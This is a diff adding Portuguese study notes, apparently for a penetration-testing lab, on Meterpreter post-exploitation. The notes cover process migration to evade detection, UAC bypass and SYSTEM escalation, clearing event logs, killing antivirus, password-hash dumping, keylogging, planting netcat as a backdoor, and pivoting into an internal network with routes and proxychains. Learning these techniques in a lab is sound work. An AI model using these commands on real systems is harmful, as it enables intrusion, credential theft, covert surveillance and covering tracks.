@@ -1,0 +1,175 @@
+Migrando processos no meterpreter:
+-Verificar os processos com o comando "ps" no meterpreter e escolher um processo pelo PID para migrar.
+
+migrate 4072
+
+Obs: Dessa forma fazemos o migrate de forma manual.
+
+Pode usar um POST exploit para fazer isso de forma "automatica" (Escolhe um processo e faz a migração)
+
+run post/windows/manage/migrate
+
+---------------------------------
+---------------------------------
+É importante ir migrando os processos, para dificultar a detecção do backdoor.
+-Normalmente, usa-se o PID do processo explorer.exe para fazer o migrade.
+
+---------------------------------
+
+Elevando probilhegios para conseguir acesso system do sistema (Administrador)
+
+Verificando permissões de usuario: (Usuario Logado)
+
+getuid
+
+Para forçar a mudança de usuario para SYSTEM: (NO WINDOWS XP FUNCIONA BEM O ESCALAMENTO DE PERMISSAO)
+
+getsystem
+
+###NO WINDOWS 7, existe o UAC (User Access Control) que é a janela que solicita permissões de administrador.
+
+Para o Windows 7 é preciso um EXPLOIT para fazer a escalação de processo.
+
+exploi/windows/local/bypassuac    (Faz o bypass do UAC)
+
+use exploi/windows/local/bypassuac
+
+Para esse exploit, é preciso setar a sessão do meterpreter do windows 7.
+-Será aberta uma nova sessão com o bypass de UAC ativo. (UAC desabilitado)
+
+Verifica novamente os privilegios (USUARIO)
+getuid
+
+Faz o escalamento de permissão para System:
+getsystem
+
+------------------------------------------------
+
+Verifica Informações do sistema:
+
+sysinfo
+
+Acesso ao shell do Windows:
+
+shell
+
+Tira um print screen da tela da vitima:
+
+screenshot
+
+Faz a limpeza dos logs do Windows (Limpa rastro) e apaga os registros do event viewer
+
+clearev
+
+Para matar processos de antivirus na vitima:
+
+run killav  
+
+###O comando "run", serve para rodar alguns scripts dentro do meterpreter
+
+Desabilitar mouse/teclado/all do usuario vitima:
+
+uictl disable mouse
+uictl disable keyboard
+uictl disable all
+
+Para habilitar, usar o "enable"
+
+Capturar hashs de senha dos usuarios remotos:
+
+hashdump   (Só captura senhas md5 caso esteja com modo superusuario)
+
+Faz keylogger:
+
+keyscan_start   (iniciar o keylogger)
+keyscan_dump   (Mostra os caracteres digitados)
+keyscan_stop   (Para o keylogger)
+
+Baixa o arquivo da maquina remota:
+
+downloar arquivo.exe
+
+Faz upload de um arquivo para a maquina remota:
+
+upload arquivo.exe
+
+####Podemos jogar arquivos maliciosos dento do sistema
+####Podemos jogar o netcat dentro da maquina da vitima, mantendo o acesso via backdoor com netcat 
+
+Jogar o netcat dentro do sistema Windows:
+
+upload nc.exe c:\windows\system32\nc.exe
+
+### No meterpreter ha diversas extensões que podem ser usadas, por exemplo o "incognito" 
+-O incognito permite criar usuarios, grupos e manipular permissões na maquina remota
+-Permite se passar por usuario especifico.
+
+use incognito
+
+###Verificar os comandos disponiveis do incognito.
+
+Instalar VNC na maquina remoto para visualizar a tela da maquina infectada.
+
+run vnc
+
+###A tela sera aberta automaticamente
+-------------------------------------
+
+tendo acesso a maquina em rede interna, via maquina acessivel com duas interfaces (duas redes diferentes)
+
+Cenario:
+Kali Linux (1 interface 192.168.1.2)
+Windows 7 (2 interfaces, 1 192.168.1.3 e 192.168.136.2)
+Windows XP (1 interface 192.168.136.3)
+
+É necessario ativar o roteamento Global do kali:
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Criar rota para conseguir acesso a rede interna 192.168.136.0 no meterpreter
+
+route add 192.168.1.0 255.255.255.0 5     (O numero 5 representa a sessão do meterpreter que ira ser utilizada para acessar a maquina em rede diferente da do Kali)
+###Verificar o "session -l" para identificar a sessão a ser usada.
+
+Para verificar a rota criada:
+
+route print
+
+Para fazer um portscan na maquina em rede distinta utilizando o mudulo auxiliary/scanner/portscan/tcp.
+
+use auxiliary/scanner/portscan/tcp
+
+Setar a rede que criamos a rota:
+
+set RHOSTS 192.168.136.0/24
+
+Fazer o exploit (nmap da rede que roteamos):
+
+exploit.
+
+###No caso acima, a rede 192.168.136.0 esta disponivel apenas dentro do metepreter.
+-----------------------------------------
+
+METODO 2 PARA conseguir acesso em rede distinta.
+
+utilizar o socks4
+Modulo auxiliar:
+
+use auxiliary/server/socks4a
+
+###Comentar as linhas do /etc/proxychans.conf
+
+vi /etc/proxychains.conf
+
+#proxy_dns
+#socks4 172.0.0.1 9050    (Serviço do tor)
+#socks5 172.0.0.1 9050    (Serviço do tor)
+socks4 172.0.0.1 1080   #Adicionar essa linha, que ira fazer o direcionamento da rota para a sessão do meterpreter com acesso a rede interna da vitima que queremos alcançar
+:wq!
+
+Apos salvar o arquivo, ja poderemos usar o proxychains para identificar a rede interna da maquina remota.
+
+proxychains nmap -Pn 192.168.136.0/24
+
+
+
